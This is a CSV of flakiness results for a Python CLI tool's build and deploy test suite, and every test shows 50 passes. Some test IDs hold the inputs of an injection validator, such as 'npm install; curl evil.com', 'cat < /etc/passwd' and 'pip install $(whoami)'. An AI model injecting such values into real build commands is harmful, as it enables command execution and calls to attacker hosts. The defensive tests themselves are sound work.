test_id,pass,fail,missing,total,verdict
tests/unit_tests/test_dependency_tracking.py::test_dep_paths_scanned_in_order,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCallHostBackendWithOptionalTenant::test_workspace_retry_then_not_enabled_gives_actionable_error,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestAddDirectory::test_excludes_pycache,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestCreateArchive::test_excludes_pycache,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_docker.py::test_compose_with_api_version_and_custom_postgres,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_build_command_shows_wolfi_warning,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_build_command_with_api_version,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_build_command_with_api_version_and_base_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_delete_command,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_delete_command_cancelled,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_delete_command_force,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_list_command,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_list_command_no_results,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_revisions_list_command,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_revisions_list_command_no_results,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_revisions_list_command_with_explicit_limit,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dev_command_requires_ssl_certfile_and_keyfile_together,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_basic,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_combined_mode,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_distributed_mode,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_distributed_with_explicit_base_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_new_style_config,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_no_wolfi_warning_when_wolfi_set,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_shows_wolfi_warning,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_with_api_version,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_with_api_version_and_base_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_with_api_version_nodejs,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_with_bad_config,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_dockerfile_command_with_base_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_top_level_help_shows_deploy_subcommands,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_top_level_help_truncates_command_descriptions_to_single_line,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected["],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[$],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[;],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[<],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[>],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[\\],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[\n],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[\r],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[\t],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[\x00],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[`],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_disallowed_chars_rejected[|],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_double_ampersand_allowed,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[cat < /etc/passwd],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[curl evil.com & disown],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[npm install & curl evil.com],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[npm install; curl evil.com],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[pip install $(whoami)],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[pip install ${IFS}evil],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[pip install > /dev/null],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_injection_patterns_rejected[pip install foo | curl attacker.com],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_single_ampersand_rejected,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_valid_commands_allowed[next build && next export],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_valid_commands_allowed[npm ci && npm run build],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_valid_commands_allowed[npm install],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_valid_commands_allowed[pip install -e '.[dev]'],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::TestHasDisallowedBuildCommandContent::test_valid_commands_allowed[pnpm install --frozen-lockfile],50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_missing_config_emits_json_error,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_missing_config_shows_actionable_error,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestCreateArchive::test_yields_archive_with_config,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_retain_build_tools,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_combined_mode_no_orchestrator,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_default_mode_no_orchestrator,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_distributed_executor_gets_correct_paths,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_distributed_mode,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_distributed_mode_generates_two_dockerfiles,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_distributed_mode_with_env_file,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_end_to_end,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_env_file,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_env_vars,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_simple_config,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_watch,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_compose_with_api_version,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_end_to_end,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_executor_base_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_gen_ui_python,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_gen_ui_python_uses_workdir_with_special_chars,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_invalid_inputs,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_local_deps,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_multiplatform,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_no_webhooks,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_nodejs,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_nodejs_internal_docker_tag,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_nodejs_uses_workdir_with_special_chars,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_outside_path,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_pip_installer,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_pipconfig,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_pyproject,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_python_encryption,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_python_encryption_bad_path,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_python_encryption_formatted,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_simple,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_accepts_path_workspace_sources,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_accepts_root_path_workspace_sources,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_detects_js_pm_from_target_package_root,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_does_not_apply_gitignore,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_honors_root_workspace_sources,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_ignores_unrelated_root_sources,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_ignores_unrelated_workspace_package_sources,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_missing_lockfile,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_missing_pyproject,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_never_reincludes_always_excluded_subtrees,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_old_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_preserves_negated_dockerignore_descendants,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_prunes_unrelated_ignored_subtrees,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_rejects_ignored_workspace_member,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_rejects_invalid_source_package_type,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_rejects_mismatched_path_workspace_sources,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_rejects_package_false_workspace_dependency,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_rejects_paths_outside_target_closure,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_rejects_unrelated_member_when_root_in_closure,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_requires_explicit_workspace_sources,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_root_package_copy_skips_unrelated_members,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_skips_dockerignore_entries,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_skips_dockerignore_entries_in_workspace,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_supports_single_uv_project_root,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_uses_workdir_for_js_install_with_special_chars,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_uv_lock_validates_root_path_sources_relative_to_project_root,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_webhooks_node,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_webhooks_python,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_config_to_docker_with_api_version,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_default_base_image_combined_mode,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_default_base_image_distributed_mode,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_default_base_image_distributed_with_explicit_base,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_default_base_image_nodejs,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_different_node_versions_with_distro,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_different_python_versions_with_distro,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_image_distro,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_multiplatform_with_distro,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_api_version[False],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_api_version[True],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_compatible_api_version_freezes_dev_until_rc,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_compatible_api_version_promotes_to_latest_patch,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_compatible_api_version_rejects_tagged_base_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_compatible_api_version_supports_node_images,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_prerelease_api_version[0.9.0.dev1-False],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_prerelease_api_version[0.9.0.dev1-True],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_prerelease_api_version[0.9.0rc1-False],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_prerelease_api_version[0.9.0rc1-True],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_stable_floating_api_version_ignores_future_prereleases,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_docker_tag_with_stable_floating_api_version_promotes_to_future_stable,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_validate_config,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_validate_config_file,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_validate_config_image_distro,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_validate_config_multiplatform,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_validate_config_pip_installer,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_config.py::test_validate_config_rejects_unrecognized_api_version_range_operator,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestDockerConfigForToken::test_creates_config_json,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestDockerConfigForToken::test_different_registries,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestDockerConfigForToken::test_tempdir_cleaned_up,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestParseEnvFromConfig::test_env_dict,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestParseEnvFromConfig::test_env_dotenv_filters_none_values,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestParseEnvFromConfig::test_env_empty_dict_falls_back_to_dotenv,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestParseEnvFromConfig::test_env_missing_falls_back_to_dotenv,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestParseEnvFromConfig::test_env_missing_no_dotenv_returns_empty,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestParseEnvFromConfig::test_env_string_dotenv_file,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_omits_docker_config_dir_when_none,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_passes_docker_config_dir,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_does_not_modify_config,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_util.py::test_warn_non_wolfi_distro_various_configs,50,0,0,50,NOT_FLAKY
tests/integration_tests/test_cli.py::test_template_urls_work[agent-python],50,0,0,50,NOT_FLAKY
tests/integration_tests/test_cli.py::test_template_urls_work[deep-agent-js],50,0,0,50,NOT_FLAKY
tests/integration_tests/test_cli.py::test_template_urls_work[deep-agent-python],50,0,0,50,NOT_FLAKY
tests/integration_tests/test_cli.py::test_template_urls_work[new-langgraph-project-js],50,0,0,50,NOT_FLAKY
tests/integration_tests/test_cli.py::test_template_urls_work[new-langgraph-project-python],50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_build_generate_proper_build_context,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_deploy_revisions_list_missing_deployment_id_shows_usage,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_prepare_args_and_stdin,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_prepare_args_and_stdin_distributed_mode,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_prepare_args_and_stdin_with_api_version,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_prepare_args_and_stdin_with_api_version_and_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_prepare_args_and_stdin_with_image,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_cli.py::test_version_option,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_templates.py::test_create_new_with_mocked_download,50,0,0,50,NOT_FLAKY
tests/unit_tests/cli/test_templates.py::test_invalid_template_id,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestAddDirectory::test_adds_files_with_prefix,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestAddDirectory::test_adds_files_without_prefix,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestAddDirectory::test_respects_custom_ignore_patterns,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestBuildIgnoreSpec::test_always_excludes_builtins,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestBuildIgnoreSpec::test_can_skip_gitignore,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestBuildIgnoreSpec::test_merges_both_ignore_files,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestBuildIgnoreSpec::test_merges_dockerignore,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestBuildIgnoreSpec::test_merges_gitignore,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestBuildIgnoreSpec::test_no_ignore_files_only_builtins,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestBuildIgnoreSpec::test_regular_file_not_excluded,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestCreateArchive::test_cleans_up_tmp_dir_on_exception,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestCreateArchive::test_cleans_up_tmp_dir_on_normal_exit,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestCreateArchive::test_handles_extra_contexts,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestCreateArchive::test_raises_on_oversized_archive,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_directory_passes,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_dotdot_as_name_component_rejected,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_dotdot_in_filename_allowed,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_hardlink_rejected,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_path_traversal_in_middle_rejected,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_path_traversal_rejected,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_regular_file_passes,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_archive.py::TestTarFilter::test_symlink_rejected,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_bare_reference_records_unknown,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_every_tracked_package_is_detectable[google-adk],50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_extras_bracket_records_unknown,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_no_match_returns_empty,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_non_string_dep_entry_ignored,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_oversized_file_is_truncated_not_raised,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_pyproject_specifier_used_when_no_lock,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_requirements_txt_specifier,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_traversal_dep_path_is_skipped,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_dependency_tracking.py::test_uv_lock_resolved_version_preferred,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCallHostBackendWithOptionalTenant::test_403_not_enabled_eu_url,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCallHostBackendWithOptionalTenant::test_403_not_enabled_gives_actionable_error,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCallHostBackendWithOptionalTenant::test_other_403_re_raises_original,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCallHostBackendWithOptionalTenant::test_success_passes_through,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCallHostBackendWithOptionalTenant::test_workspace_prompt_blocked_by_no_input,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCreateHostBackendClientNoInput::test_raises_when_no_api_key_and_no_input,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestCreateHostBackendClientNoInput::test_succeeds_with_api_key_in_env,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_error_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_heartbeat_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_heartbeat_silent_in_text_mode,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_info_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_log_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_result_event_full,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_result_event_minimal,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_status_change_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_status_change_event_with_minutes,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_status_url_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_step_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_upload_progress_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterJsonMode::test_warn_event,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterTextMode::test_log_writes_text,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterTextMode::test_result_succeeded_text,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEmitterTextMode::test_step_writes_text,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEnvWithoutDeploymentName::test_noop_when_deployment_name_absent,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestEnvWithoutDeploymentName::test_removes_deployment_name_only,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeImageTag::test_alphanumeric_and_special,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeImageTag::test_empty_defaults_to_latest,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeImageTag::test_invalid_chars_raises,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeImageTag::test_spaces_raises,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeImageTag::test_valid_tag,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_all_invalid_chars_returns_app,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_dots_replaced_with_hyphens,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_empty_string_returns_app,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_leading_trailing_stripped,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_none_returns_app,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_simple_name,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_special_chars_replaced,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_underscores_replaced_with_hyphens,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestNormalizeName::test_uppercase_lowered,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolveEnvPath::test_default_env_is_cwd_dotenv,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolveEnvPath::test_inline_env_dict_returns_none,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolveEnvPath::test_missing_env_file_returns_none,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolveEnvPath::test_relative_env_path_resolves,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_empty_repodigests_falls_back_with_warning,50,0,0,50,NOT_FLAKY
tests/unit_tests/test_deploy_helpers.py::TestResolvePushedImageDigest::test_filters_to_matching_repo,50,0,0,50,NOT_FLAKY
